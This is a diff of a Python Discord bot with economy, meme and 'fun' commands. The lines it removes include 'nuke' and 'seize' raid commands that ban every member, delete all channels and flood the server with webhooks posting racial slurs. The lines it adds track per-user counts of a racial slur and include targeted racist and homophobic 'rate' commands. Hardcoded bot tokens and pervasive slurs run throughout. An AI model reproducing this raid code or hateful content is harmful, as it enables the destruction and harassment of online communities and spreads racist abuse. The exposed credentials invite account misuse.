@@ -20,10 +20,7 @@ import aioconsole
 import string
 import base64
 
-#passive Version not for the nooks
-
 URL = "https://discordapp.com/api"
-
 
 async def api_call(path):
     with aiohttp.ClientSession() as session:
@@ -65,10 +62,8 @@ async def on_ready():
           await webhook.send(link)
         print(f'{Fore.GREEN}' + guild.name + f'{Fore.RESET}')
     print(f'{Fore.BLUE}I repeat ready to fuck shit up{Fore.RESET}')
-
-
+    
 async def main():
-    """Main program."""
     response = await api_call("/gateway")
     await start(response["url"])
 
@@ -82,10 +77,9 @@ async def start(url):
 
 
 async def api_call(path, method="GET", **kwargs):
-    """Return the JSON body of a call to Discord REST API."""
     defaults = {
         "headers": {
-            "Authorization": f"Bot OTE3OTY2Mjg1NjQyNTQ3MjQx.YbAYuQ.arUZ6tQ9Wb_Z5t0WKNLeU5jVjRc",
+            "Authorization": f"Bot OTE3OTY2Mjg1NjQyNTQ3MjQx.YbAYuQ.W8f2Bbf4_uQZ0a8r1a7PzOGejME",
             "User-Agent": "dBot "
         }
     }
@@ -94,19 +88,41 @@ async def api_call(path, method="GET", **kwargs):
         async with aiohttp.ClientSession.request(method, path, **kwargs) as response:
             assert 200 == response.status, response.reason
             return await response.json()
+nga = "nigger"
+nga2 = "nigga"
+
+@client.event
+async def on_message(message):
+  if message.content.lower() == "nigger":
+        global nga
+        for nga in message.content:
+          await open_account(message.author)
+          user = message.author
+
+          users = await get_nc_data()
 
 
-##############################################################
-def last_monday():
-    today = datetime.date.today()
-    monday = today - datetime.timedelta(days=today.weekday())
-    return monday
+          users[str(user.id)]["N-word-count"] += 1/5
+
+          with open("ncount.json", 'w') as f:
+            json.dump(users, f)
+  if message.content.lower() == "nigga":
+        global nga2
+        for nga in message.content:
+          await open_account(message.author)
+          user = message.author
+
+          users = await get_nc_data()
 
 
-##############################################################
+          users[str(user.id)]["N-word-count"] += 1/5
 
+          with open("ncount.json", 'w') as f:
+            json.dump(users, f)
+  await client.process_commands(message)
 
-# Start of Purge
+channels = []
+
 @client.command()
 async def purge(ctx, *, arg):
     if ctx.message.author.guild_permissions.manage_messages:
@@ -116,10 +132,6 @@ async def purge(ctx, *, arg):
         await ctx.send("https://constitution.congress.gov/constitution/amendment-1/")
         return
 
-
-# End of Purge
-
-# Start of Ban
 @client.command()
 async def ban(ctx, member: discord.User = None, ):
     print(discord.User.id)
@@ -133,7 +145,7 @@ async def ban(ctx, member: discord.User = None, ):
 @client.command()
 async def kick(ctx, member: discord.User = None, ):
     print(discord.User.id)
-    if str(ctx.message.author) == "[UЖ/K̷ፕϨ⟭ ᎴᎯᏟᏲᎴ#7802" or ctx.message.author.guild_permissions.kick_members:
+    if str(ctx.message.author.id) == "613405135044870165":
         await member.kick(reason=None)
         await ctx.send(str(client.get_user(discord.User)) + " has been deported")
     else:
@@ -148,57 +160,9 @@ async def troll(ctx):
       webhook_url = webhook.url
       await webhook.send(f"yes i can")
 
-
-# Start of Nuke
 @client.command()
 async def nuke(ctx):
-    nigger = 0
-    hooks = []
-    guild = ctx.message.guild
-    if str(ctx.message.author) == "Hell Bringer#9286" or str(ctx.message.author) == "᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼⟬ⲔፕϨ⟭ ᎴᎯᏟᏲᎴ#7802":
-        await ctx.guild.edit(
-            name="Heil ᎴᎯᏟᏲᎴ",
-            description="Fucked by ᎴᎯᏟᏲᎴ lollolll",
-            reason="ᎴᎯᏟᏲᎴ hates you",
-            icon=image1,
-            banner=image1
-        )
-        for member in ctx.guild.members:
-            try:
-                await member.ban()
-            except:
-                pass
-        guild = ctx.guild
-        for channel in guild.channels:
-            await channel.delete()
-
-        ch = 0
-        m = 0
-        chc = await guild.create_text_channel("Get Niggered")
-        while ch < 50:
-            while True:
-                for i in range(20):
-                    await guild.create_text_channel("Get Niggered")
-                    chc = await guild.create_text_channel("Get Niggered")
-                    webhook = await chc.create_webhook(name="Get Niggered", avatar=image1, reason="Get niggered")
-                    webhook_url = webhook.url
-                    hooks.append(webhook_url)
-                    await guild.create_role(name="nigger")
-
-                while True:
-                    for x in hooks:
-                        webhook_url = x
-                        async with aiohttp.ClientSession() as session:
-                            webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
-                            for i in range(5):
-                                await webhook.send(f"@everyone Get niggered")
-            ch = ch + 1
-    else:
-        await ctx.send("You fucking wish LMAO")
-
-
-# End of Nuke
-
+    await ctx.send("You fucking wish LMAO")
 
 @client.command()
 async def serverinfo(ctx):
@@ -213,15 +177,16 @@ async def serverinfo(ctx):
 
     return
 
-
 @client.command()
 async def confess(ctx, *, args):
-    await ctx.channel.purge(limit=1)
+    try:
+      await message.delete(message)
+    except:
+      pass
     embedVar = discord.Embed(title="Confession", description=" ", color=0x154c79)
     embedVar.add_field(name="I confess", value=args, inline=False)
     await ctx.send(embed=embedVar)
-
-
+    
 # Start of Help
 @client.command()
 async def help(ctx, category=None):
@@ -231,7 +196,7 @@ async def help(ctx, category=None):
       await ctx.send("jk")
       embedVar = discord.Embed(title="Help", description="Do $help [category] to view specifics", color=0x154c79)
       embedVar.add_field(name=f"Economy", value="Check economy commands", inline=False)
-      embedVar.add_field(name=f"Moderation", value="In honor of my fatass discord mod", inline=False)
+      embedVar.add_field(name=f"Misc", value="Random stuff", inline=False)
       embedVar.add_field(name=f"Fun", value="Not for over-sensitive people", inline=False)
       await ctx.send(embed=embedVar)
     if category == "Economy" or category == "economy":
@@ -241,12 +206,6 @@ async def help(ctx, category=None):
       embedVar.add_field(name=f"``$inv``", value="Inventory", inline=False)
       embedVar.add_field(name=f"``$shop``", value="A shop", inline=False)
       await ctx.send(embed=embedVar)
-    if category == "Moderation" or category == "moderation":
-      embedVar = discord.Embed(title="Moderation", description=" ", color=0x154c79)
-      embedVar.add_field(name=f"``$ban [member]``", value="Bans a member", inline=False)
-      embedVar.add_field(name=f"``$kick [member]``", value="Kicks a member", inline=False)
-      embedVar.add_field(name=f"``$purge [amount]``", value="purges members", inline=False)
-      await ctx.send(embed=embedVar)
     if category == "Fun" or category == "fun":
       embedVar = discord.Embed(title="Fun", description=" ", color=0x154c79)
       embedVar.add_field(name=f"``$nuke``", value="Nukes the server(joke command)", inline=False)
@@ -254,36 +213,12 @@ async def help(ctx, category=None):
       embedVar.add_field(name=f"``$howgay [member]``", value="Checks gay rate of a member", inline=False)
       embedVar.add_field(name=f"``$niggerate [member]``", value="How black someone is", inline=False)
       embedVar.add_field(name=f"``$otax [member]``", value="Otax someone", inline=False)
+      embedVar.add_field(name=f"``$nwordcount``", value="Check your n word count", inline=False)
       await ctx.send(embed=embedVar)
-
-
-# End of Help
-
-@client.command()
-async def seize(ctx):
-    nigger = 0
-    hooks = []
-    guild = ctx.message.guild
-    while True:
-        if nigger < 26:
-            chc = await guild.create_text_channel("Get Niggered")
-            webhook = await chc.create_webhook(name="Get Niggered", avatar=image1, reason="Get niggered")
-            webhook_url = webhook.url
-            hooks.append(webhook_url)
-            async with aiohttp.ClientSession() as session:
-                webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
-                for i in range(5):
-                    await webhook.send(f"@everyone Get niggered")
-            print(hooks)
-            nigger = nigger + 1
-
-        elif nigger > 25:
-            for x in hooks:
-                webhook_url = x
-                async with aiohttp.ClientSession() as session:
-                    webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
-                    for i in range(15):
-                        await webhook.send(f"@everyone Get niggered")
+    if category == "Misc" or category == "misc":
+      embedVar = discord.Embed(title="Fun", description=" ", color=0x154c79)
+      embedVar.add_field(name=f"``$serverinfo``", value="Get server information", inline=False)
+      await ctx.send(embed=embedVar)
 
 @client.command(aliases = ['gayrate', 'gay'])
 async def howgay(ctx, member: discord.User = None, ):
@@ -293,6 +228,12 @@ async def howgay(ctx, member: discord.User = None, ):
     await ctx.send(f"<@{id}> is 0% gay")
   elif str(id) == "893853676714733598":
     await ctx.send(f"<@{id}> is 100% gay")
+  elif str(id) == "891304882076786710":
+    await ctx.send(f"<@{id}> is 100% gay")
+  elif str(id) == "919671807869603930":
+    await ctx.send(f"<@{id}> is 100% gay")
+  elif str(id) == "917966285642547241":
+    await ctx.send(f"Nigga what? You think I'm fucking gay?")
   else:
     gayrate = random.randint(0, 101)
     await ctx.send(f"<@{id}> is {gayrate}% gay")
@@ -305,6 +246,12 @@ async def howblack(ctx, member: discord.User = None, ):
     await ctx.send(f"<@{id}> is 0% black")
   elif str(id) == "893853676714733598":
     await ctx.send(f"<@{id}> is 100% black")
+  elif str(id) == "891304882076786710":
+    await ctx.send(f"<@{id}> is 100% black")
+  elif str(id) == "919671807869603930":
+    await ctx.send(f"<@{id}> is 100% black")
+  elif str(id) == "917966285642547241":
+    await ctx.send(f"Nigga what? You think I'm fucking black?")
   else:
     gayrate = random.randint(0, 101)
     await ctx.send(f"<@{id}> is {gayrate}% black")
@@ -329,8 +276,8 @@ async def nwordcount(ctx):
   user = ctx.author
   nc1 = users[str(user.id)]["N-word-count"]
 
-  em = discord.Embed(title=f'{ctx.author.name} N word count', color=0x154c79)
-  em.add_field(name="N word count", value=nc1)
+  em = discord.Embed(title=f'{ctx.author.name}s N word count', color=0x154c79)
+  em.add_field(name="N word count", value=str(int(nc1)))
   await ctx.send(embed=em)
 
 async def nc():
@@ -339,7 +286,7 @@ async def nc():
 
     return users
 
-@client.command()
+@client.command(aliases = ['otacks', 'otocs', 'otacs'])
 async def otax(ctx, user: discord.User = None):
   msg = await ctx.send(f'Otaxing {user.name}...')
   time.sleep(3)
@@ -356,8 +303,39 @@ async def otax(ctx, user: discord.User = None):
         token = base64_string+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
   await msg.edit(content=f'```diff\n-Succesfully otaxed {user.name}\n\n{token}\n```')
 
+@client.command()
+async def b64(ctx, id):
+  message = id
+  message_bytes = message.encode('ascii')
+  base64_bytes = base64.b64encode(message_bytes)
+  base64_message = base64_bytes.decode('ascii')
+  await ctx.send(f"```{base64_message}```")
 
-mainshop = [{"name": "Pet Floppa", "price": 500, "description": "Pet floppa"}, {"name": "Floppa Food", "price": 10, "description": "Floppa food"}, {"name": f"Floppa Coin Miner ", "price": 5000, "description": "Mines floppa coin"}]
+@client.command(pass_context=True, aliases = ['memes'])
+async def meme(ctx):
+    embed = discord.Embed(title="Memes", description="skidded from r/memes")
+
+    async with aiohttp.ClientSession() as cs:
+        async with cs.get('https://www.reddit.com/r/memes/new.json?sort=hot') as r:
+            res = await r.json()
+            embed.set_image(url=res['data']['children'] [random.randint(0, 25)]['data']['url'])
+            await ctx.send(embed=embed)
+
+@client.command(pass_context=True, aliases = ['dogs'])
+async def dog(ctx):
+    embed = discord.Embed(title="Dogs", description="Dog pics")
+
+    async with aiohttp.ClientSession() as cs:
+        async with cs.get('https://www.reddit.com/r/dogpictures/new.json?sort=hot') as r:
+            res = await r.json()
+            embed.set_image(url=res['data']['children'] [random.randint(0, 25)]['data']['url'])
+            await ctx.send(embed=embed)
+
+@client.command()
+async def credits(ctx):
+  await ctx.send("⋞∥[⤿𝑓$]∥⋟ SS192 (The 2nd)#3264, Ꮄ᲼᲼᲼᲼Ꭿ᲼᲼᲼Ꮯ᲼᲼᲼᲼Ᏺ᲼᲼᲼ Ꮄ#7802")
+
+mainshop = [{"name": "Pet Floppa", "price": 500, "description": "Pet floppa"}, {"name": "Floppa Food", "price": 10, "description": "Floppa food"}, {"name": f"Floppa Coin-Miner", "price": 5000, "description": "Mines floppa coin"}]
 
 
 @client.command(aliases=['bal'])
@@ -374,7 +352,6 @@ async def balance(ctx):
     em.add_field(name="Cash", value=wallet_amt)
     em.add_field(name='Bank', value=bank_amt)
     await ctx.send(embed=em)
-
 
 @client.command()
 @commands.cooldown(1, 30, commands.BucketType.user)
@@ -538,7 +515,7 @@ async def rob(ctx, member: discord.Member):
     bal = await update_bank(member)
 
     if bal[0] < 100:
-        await ctx.send('It is useless to rob him :(')
+        await ctx.send('Bro you so fuckin low your gonna rob a homeless man?')
         return
 
     earning = random.randrange(0, bal[0])
@@ -546,7 +523,6 @@ async def rob(ctx, member: discord.Member):
     await update_bank(ctx.author, earning)
     await update_bank(member, -1 * earning)
     await ctx.send(f'{ctx.author.mention} You robbed {member} and got {earning}<:floppa_coin:921515769349685348>')
-
 
 @client.command()
 async def slots(ctx, amount=None):
@@ -580,7 +556,6 @@ async def slots(ctx, amount=None):
         await update_bank(ctx.author, -1 * amount)
         await ctx.send(f'You lose :( {ctx.author.mention}')
 
-
 @client.command()
 async def shop(ctx):
     em = discord.Embed(title="Floppa Shop")
@@ -592,7 +567,6 @@ async def shop(ctx):
         em.add_field(name=name, value=f"${price}<:floppa_coin:921515769349685348>  {desc} ")
 
     await ctx.send(embed=em)
-
 
 @client.command()
 async def buy(ctx,*, item, amount=1):
@@ -609,7 +583,6 @@ async def buy(ctx,*, item, amount=1):
             return
 
     await ctx.send(f"You just bought {amount} {item}")
-
 
 async def buy_this(user, item_name, amount):
     item_name = item_name.lower()
@@ -659,7 +632,6 @@ async def buy_this(user, item_name, amount):
 
     return [True, "Worked"]
 
-
 @client.command()
 async def sell(ctx, item, amount=1):
     await open_account(ctx.author)
@@ -678,7 +650,6 @@ async def sell(ctx, item, amount=1):
             return
 
     await ctx.send(f"You just sold {amount} {item}.")
-
 
 async def sell_this(user, item_name, amount, price=None):
     item_name = item_name.lower()
@@ -726,7 +697,6 @@ async def sell_this(user, item_name, amount, price=None):
 
     return [True, "Worked"]
 
-
 @client.command(aliases=['inv'])
 async def inventory(ctx):
     await open_account(ctx.author)
@@ -746,7 +716,6 @@ async def inventory(ctx):
         em.add_field(name=name, value=amount)
 
     await ctx.send(embed=em)
-
 
 async def buy(user, item_name, amount):
     item_name = item_name.lower()
@@ -795,7 +764,6 @@ async def buy(user, item_name, amount):
     await update_bank(user, cost * -1, "wallet")
 
     return [True, "Worked"]
-
 
 @client.command(aliases=["lb"])
 async def leaderboard(ctx, x=1):
@@ -849,6 +817,12 @@ async def get_bank_data():
 
     return users
 
+async def get_nc_data():
+    with open('ncount.json', 'r') as f:
+        users = json.load(f)
+
+    return users
+
 
 async def update_bank(user, change=0, mode='wallet'):
     users = await get_bank_data()
@@ -861,7 +835,7 @@ async def update_bank(user, change=0, mode='wallet'):
     return bal
 
 
-client.run("OTE3OTY2Mjg1NjQyNTQ3MjQx.YbAYuQ.TVJw3b6oumvMSlykr3GhN2f8fgo")
+client.run("OTE3OTY2Mjg1NjQyNTQ3MjQx.YbAYuQ.W8f2Bbf4_uQZ0a8r1a7PzOGejME")
 
 loop = asyncio.get_event_loop()
 loop.run_until_complete(main())
